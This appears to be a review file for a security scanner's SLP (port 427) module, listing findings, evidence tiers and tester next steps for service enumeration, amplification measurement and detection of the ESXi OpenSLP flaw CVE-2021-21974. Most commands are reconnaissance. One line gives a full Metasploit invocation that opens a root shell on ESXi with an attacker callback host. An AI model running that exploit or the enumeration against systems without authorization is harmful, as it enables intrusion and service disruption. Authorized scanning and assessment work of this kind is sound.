summary: Rich T1 module with build-gated CVE detection (rare and correct: no CVE claim when version can't be parsed). The ESXi OpenSLP RCE flag is the highest-value promotion target (already publishes 3 CVEs). SLP amplifier is a KEV finding, always flagged when 427/udp responds. Missing: no probe-side ESXi RCE PoC (MSF module referenced only in comments/runbook — correct default given destructive nature). Multicast sweep is deferred as documented.

findings.promotion_notes: Signal only — the meaningful findings are the ones below.

findings.tier_evidence: SrvTypeRqst returned actual types — deterministic unauth read.
findings.promotion_notes: Auto-feed enumerated service types + URLs into cross-service scanners (HTTP/IPP/SMB/NFS/LDAP/wbem/cimom) as new scan targets — turns the catalogue into free discovery.
findings.tester_next_step: slptool -u <ip> findsrvtypes; for each type: slptool -u <ip> findsrvs <type>; feed URLs into nmap -sV -Pn <extracted_urls>.

findings.title_pattern: SLP URL enumeration discloses service endpoints
findings.promotion_notes: Same as slp_service_catalogue — auto-target the URLs downstream.
findings.tester_next_step: slptool -u <ip> findsrvs service:service-agent; parse each URL and enqueue for the matching service module (HTTP/CIFS/NFS/etc.).

findings.title_pattern: SLP AttrRqst discloses per-service attributes unauthenticated
findings.tier_evidence: AttrRqst returned attribute tuples per URL.
findings.promotion_notes: Grep attribute values for cleartext secrets (managementserver credentials, uuid tokens); feed product/version into os_fingerprints shared surface for exploit selection.
findings.tester_next_step: slptool -u <ip> findattrs service:VMwareInfrastructure  # look for uuid, managementserver, product, version, build.

findings.tier_evidence: Any 427/udp responder answering AttrRqst qualifies — deterministic by protocol behaviour.
findings.promotion_notes: Add measured BAF (spoofed source PoC — send minimal request, measure returned payload) — must be gated to lab targets since real spoofed egress = DDoS launch. Better: measure req-vs-response byte ratio non-spoofed for reporting.
findings.tester_next_step: nmap -sU -p427 --script slp-info <ip> | grep -A2 'response'; measured BAF = response_bytes / 82. Do NOT test spoofed egress off-lab.

findings.title_pattern: SLP Directory Agent identified (aggregates network SAs)
findings.promotion_notes: Query the DA with a broad SrvRqst to pull every SA in the scope; DA aggregation multiplies disclosure surface.
findings.tester_next_step: slptool -u <da_ip> findsrvs service:  # empty type = all SAs registered with the DA.

findings.title_pattern: VMware ESXi OpenSLP pre-auth RCE — build-gated (CVE-2021-21974)
findings.tier_evidence: Build number parsed from AttrRqst reply and compared against fix build — deterministic version-gated CVE match, not a banner guess.
findings.promotion_notes: T3 = actual MSF exploit/multi/vmware/openslp_heap_overflow drops a shell as root on ESXi — destructive class (may crash hostd or the OpenSLP daemon; production ESXi = tenant impact). Only under strict --exploit flag with operator ROE confirmation.
findings.tester_next_step: msfconsole -q -x 'use exploit/multi/vmware/openslp_heap_overflow; set RHOSTS <ip>; set LHOST <attacker>; run'  # root RCE; do NOT run without ROE. Also: python PoC gists exist for CVE-2019-5544.

findings.title_pattern: ESXi / WBEM URL advertised via SLP — review for OpenSLP RCE
findings.tier_evidence: Product string present but build not parseable — class flag, no CVE assertion.
findings.promotion_notes: Add a second AttrRqst variant (specific tag list) that some ESXi builds return the version in; or curl https://<ip>/ui/ (redirect banner) for out-of-band build. Then the base check can promote to slp_esxi_openslp_rce automatically.
findings.tester_next_step: curl -sk https://<ip>/ui/ | grep -oE 'ESXi [0-9.]+'  # front-end sometimes carries the version; then compare against VMSA-2021-0002.

findings.title_pattern: ESXi build advertised via SLP appears patched
findings.tester_next_step: Continue restricting SLP to management network.

findings.title_pattern: SLP scope tags disclose environment structure
SLP authentication blocks observed in replies
SLP replies carry no authentication blocks
findings.tier_evidence: Confirmed absence — every reply parsed, none carried auth blocks.
findings.promotion_notes: Already correctly reported; pairs with disclosure findings.

findings.tier_evidence: Substring match in attribute strings — pure fingerprint.
findings.promotion_notes: Feed OpenSLP version (if parseable) into a CVE gate matching ESXi/OpenSLP advisory line (adds T1 without new probes).
findings.tester_next_step: slptool -u <ip> findattrs service:service-agent  # grep for version; compare to OpenSLP release notes.
